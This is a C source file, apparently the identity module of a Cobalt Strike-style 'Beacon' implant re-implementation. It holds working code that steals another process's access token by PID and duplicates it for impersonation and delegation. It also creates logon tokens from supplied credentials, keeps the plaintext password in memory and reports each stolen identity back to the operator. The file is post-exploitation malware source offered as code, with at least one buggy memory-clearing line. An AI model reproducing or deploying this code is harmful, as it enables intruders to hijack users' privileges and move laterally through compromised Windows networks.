#include "pch.h"

#include "identity.h"

#include "beacon.h"


HANDLE gIdentityToken;
BOOL gIdentityIsLoggedIn;

WCHAR* gIdentityDomain;
WCHAR* gIdentityUsername;
WCHAR* gIdentityPassword;
datap* gIdentityCredentialsParser;

/**
 * Retrieves the username associated with the given token handle.
 *
 * @param hToken The handle to the token.
 * @param buffer The buffer to store the username.
 * @param size The size of the buffer.
 * @return Returns TRUE if the username is successfully retrieved, FALSE otherwise.
 */
BOOL IdentityGetUserInfo(HANDLE hToken, char* buffer, int size)
{
	CHAR tokenInfo[0x1000];
	DWORD returnLength;

	// Get the token information for the given token handle.
	if (!GetTokenInformation(hToken, TokenUser, tokenInfo, sizeof(tokenInfo), &returnLength))
		return FALSE;

	CHAR name[0x200] = { 0 };
	CHAR domain[0x200] = { 0 };

	DWORD nameLength = sizeof(name);
	DWORD domainLength = sizeof(domain);

	// Lookup the account SID to retrieve the username and domain.
	if (!LookupAccountSidA(NULL, ((TOKEN_USER*)tokenInfo)->User.Sid, name, &nameLength, domain, &domainLength, NULL))
		return FALSE;

	// Format the username in the format "domain\username" and store it in the buffer.
	snprintf(buffer, size, "%s\\%s", domain, name);
	buffer[size - 1] = 0;
	return TRUE;
}

void IdentityRevertToken(void)
{
	if (gIdentityToken)
		RevertToSelf();
}

void IdentityConditionalRevert(BOOL ignoreToken)
{
	if (ignoreToken)
		IdentityRevertToken();
}

void IdentityImpersonateToken(void)
{
	if (gIdentityToken)
		ImpersonateLoggedOnUser(gIdentityToken);
}

void IdentityConditionalImpersonate(BOOL ignoreToken)
{
	if (ignoreToken)
		IdentityImpersonateToken();
}

void IdentityGetUidInternal(HANDLE hToken)
{
	char userInfo[0x200];
	if (IdentityGetUserInfo(hToken, userInfo, sizeof(userInfo)))
	{
		char uidString[0x400];
		snprintf(uidString, sizeof(uidString), BeaconIsAdmin() ? "%s (admin)" : "%s", userInfo);
		BeaconOutput(CALLBACK_TOKEN_GETUID, uidString, strlen(uidString));
	}
}

void IdentityGetUid(void)
{
	HANDLE hToken;

	if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken)
		|| OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		IdentityGetUidInternal(hToken);

		CloseHandle(hToken);
	} else if (gIdentityToken)
	{
		IdentityRevertToken();

		IdentityGetUidInternal(gIdentityToken);

		IdentityImpersonateToken();
	} else
	{
		LERROR("Failed to open token");
		BeaconErrorNA(ERROR_OPEN_TOKEN_FAILED);
	}
}

/**
 * Apply the specified token as Beacon's current thread token.
 * Sets the token for the current thread and reports the new token to the user.
 *
 * @param token The handle to the token to be used.
 * @return Returns TRUE if the identity-related operations were successful, otherwise FALSE.
 */
BOOL BeaconUseToken(HANDLE token)
{
	static const int MAX_BUFFER = 0x100;

	// Allocate a buffer to store user information
	char* buffer = malloc(MAX_BUFFER);
	memset(buffer, 0, MAX_BUFFER);

	BOOL result;
	BeaconRevertToken();

	// Impersonate the logged-on user using the specified token
	if (!ImpersonateLoggedOnUser(token))
	{
		result = FALSE;
		goto cleanup;
	}

	// Duplicate the token with maximum allowed access rights
	if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, &gIdentityToken))
	{
		result = FALSE;
		goto cleanup;
	}

	// Impersonate the logged-on user using the duplicated token
	if (!ImpersonateLoggedOnUser(gIdentityToken))
	{
		result = FALSE;
		goto cleanup;
	}

	// Get user information from the token and store it in the buffer
	if (!IdentityGetUserInfo(gIdentityToken, buffer, MAX_BUFFER))
	{
		result = FALSE;
		goto cleanup;
	}

	// Report the new token to the user
	BeaconOutput(CALLBACK_TOKEN_STOLEN, buffer, strlen(buffer));
	result = TRUE;

cleanup: 
	// Clear the buffer and free the allocated memory
	memset(buffer, 0, MAX_BUFFER);
	free(buffer);

	return result;
}

/**
 * Drops the current thread token.
 * Use this over direct calls to RevertToSelf().
 * This function cleans up other state information about the token as well.
 */
void BeaconRevertToken(void)
{
	// If there an already stolen token, close its handle.
	if (gIdentityToken)
		CloseHandle(gIdentityToken);

	// Reset the token.
	gIdentityToken = NULL;

	// Revert to the self security context (that is, drop the stolen token from the current thread)
	RevertToSelf();

	// Free the memory allocated for the credentials format.
	if (gIdentityCredentialsParser) {
		BeaconFormatFree(gIdentityCredentialsParser);
		memset(&gIdentityDomain, 0, IDENTITY_MAX_WCHARS_DOMAIN);
	}
}

/**
 * Checks if the current user running the code has administrative privileges.
 *
 * @return TRUE if Beacon is in a high-integrity context, FALSE otherwise.
 */
BOOL BeaconIsAdmin(void)
{
	// Define the SID_IDENTIFIER_AUTHORITY structure and initialize it with the SECURITY_NT_AUTHORITY constant.
	SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

	// Allocate and initialize a security identifier (SID) for the built-in administrators group.
	PSID sid;
	if (!AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &sid))
		return FALSE;

	// Check if the current token (security context) is a member of the specified group SID.
	BOOL isAdmin;
	if (!CheckTokenMembership(NULL, sid, &isAdmin)) {
		FreeSid(sid);
		return FALSE;
	}

	// Free the allocated SID and return the result.
	FreeSid(sid);
	return isAdmin;
}

void IdentityLoginUserInternal(char* domain, char* username, char* password)
{
	BeaconRevertToken();
	if(!LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &gIdentityToken))
	{
		int error = GetLastError();
		LERROR("Could not create token: %s", LAST_ERROR_STR(error));
		BeaconErrorD(ERROR_CREATE_TOKEN_FAILED, error);
		return;
	}

	if (!ImpersonateLoggedOnUser(gIdentityToken))
	{
		int error = GetLastError();
		LERROR("Failed to impersonate token: %s", LAST_ERROR_STR(error));
		BeaconErrorD(ERROR_IMPERSONATE_TOKEN_FAILED, error);
		return;
	}

	gIdentityCredentialsParser = BeaconDataAlloc(2048);
	gIdentityDomain = BeaconDataPtr(gIdentityCredentialsParser, IDENTITY_MAX_WCHARS_DOMAIN * sizeof(WCHAR));
	gIdentityUsername = BeaconDataPtr(gIdentityCredentialsParser, IDENTITY_MAX_WCHARS_USERNAME * sizeof(WCHAR));
	gIdentityPassword = BeaconDataPtr(gIdentityCredentialsParser, IDENTITY_MAX_WCHARS_PASSWORD * sizeof(WCHAR));

	toWideChar(domain, gIdentityDomain, IDENTITY_MAX_WCHARS_DOMAIN);
	toWideChar(username, gIdentityUsername, IDENTITY_MAX_WCHARS_USERNAME);
	toWideChar(password, gIdentityPassword, IDENTITY_MAX_WCHARS_PASSWORD);

	gIdentityIsLoggedIn = TRUE;
	if (IdentityGetUserInfo(gIdentityToken, (char*)username, 1024))
	{
		BeaconOutput(CALLBACK_TOKEN_STOLEN, username, strlen(username));
	}
}

void IdentityLoginUser(char* buffer, int length)
{
#define MAX_DOMAIN 1024
#define MAX_USERNAME 1024
#define MAX_PASSWORD 1024

	datap* locals = BeaconDataAlloc(MAX_DOMAIN + MAX_USERNAME + MAX_PASSWORD);
	char* domain = BeaconDataPtr(locals, MAX_DOMAIN);
	char* username = BeaconDataPtr(locals, MAX_USERNAME);
	char* password = BeaconDataPtr(locals, MAX_PASSWORD);

	datap parser;
	BeaconDataParse(&parser, buffer, length);
	if(!BeaconDataStringCopySafe(&parser, domain, MAX_DOMAIN))
	{
		LERROR("Failed to parse domain");
		return;
	}

	if(!BeaconDataStringCopySafe(&parser, username, MAX_USERNAME))
	{
		LERROR("Failed to parse username");
		return;
	}

	if(!BeaconDataStringCopySafe(&parser, password, MAX_PASSWORD))
	{
		LERROR("Failed to parse password");
		return;
	}

	IdentityLoginUserInternal(domain, username, password);
	BeaconDataFree(locals);
}

void IdentityStealToken(char* buffer, int length)
{
	int pid;

	if (length != sizeof(pid))
		return;

	datap parser;
	BeaconDataParse(&parser, buffer, length);
	pid = BeaconDataInt(&parser);

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);

	if (!hProcess)
	{
		int lastError = GetLastError();
		LERROR("Could not open process %d: %s", pid, LAST_ERROR_STR(lastError));
		BeaconErrorDD(ERROR_OPEN_PROCESS_FAILED, pid, lastError);
		return;
	}

	HANDLE hToken;
	if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken))
	{
		int lastError = GetLastError();
		LERROR("Could not open process token: %d (%s)", pid, LAST_ERROR_STR(lastError));
		BeaconErrorDD(ERROR_OPEN_PROCESS_TOKEN_FAILED, pid, lastError);		
		return;
	}

	BeaconRevertToken();

	if (!ImpersonateLoggedOnUser(hToken))
	{
		int lastError = GetLastError();
		LERROR("Failed to impersonate token from %d (%s)", pid, LAST_ERROR_STR(lastError));
		BeaconErrorDD(ERROR_IMPERSONATE_STEAL_TOKEN_FAILED, pid, lastError);
		return;
	}

	if(!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, &gIdentityToken))
	{
		int lastError = GetLastError();
		LERROR("Failed to duplicate token from %d (%s)", pid, LAST_ERROR_STR(lastError));
		BeaconErrorDD(ERROR_DUPLICATE_TOKEN_FAILED, pid, lastError);
		return;
	}

	if (!ImpersonateLoggedOnUser(gIdentityToken))
	{
		int lastError = GetLastError();
		LERROR("Failed to impersonate logged on user %d (%s)", pid, LAST_ERROR_STR(lastError));
		BeaconErrorDD(ERROR_IMPERSONATE_LOGGED_ON_USER_FAILED, pid, lastError);
		return;
	}

	CloseHandle(hProcess);

	if (hToken)
		CloseHandle(hToken);

	char accountName[0x200];
	if (IdentityGetUserInfo(gIdentityToken, accountName, sizeof(accountName)))
	{
		BeaconOutput(CALLBACK_TOKEN_STOLEN, accountName, strlen(accountName));
	}
}